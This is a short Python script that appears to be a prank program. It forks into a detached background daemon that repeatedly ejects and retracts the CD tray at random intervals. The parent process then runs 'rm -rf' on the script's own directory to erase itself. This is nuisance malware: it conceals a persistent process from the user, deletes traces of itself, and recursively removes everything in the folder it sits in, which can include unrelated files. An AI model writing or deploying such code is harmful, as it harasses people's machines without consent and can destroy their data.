#!/usr/bin/env python
#-*- coding: utf-8 -*-

# author: pBouillon (https://pierrebouillon.tech/)

import os
from os         import fork
from os         import path     as p
from os         import setsid

import random
from random     import randint

import subprocess
from subprocess import call

import time
from time       import sleep


""" action to be performed """
ACTION = ['eject', '-T']
""" max latency: 5 mn """
MAX_LATENCY = 60 * 5


def self_destruction():
    """Destroy ad's directory
    """
    call ([ 
            'rm',
            '-rf', 
            p.dirname (p.abspath(__file__))
        ])
   
def run():
    """Infinity loop
    """
    while True:
        sleep (randint (0, MAX_LATENCY))
        call (ACTION)

if __name__ == '__main__':
    pid = fork()
    if pid == 0:
        setsid()
        pid = fork()
        if pid == 0:
            run()
    else:
        self_destruction()
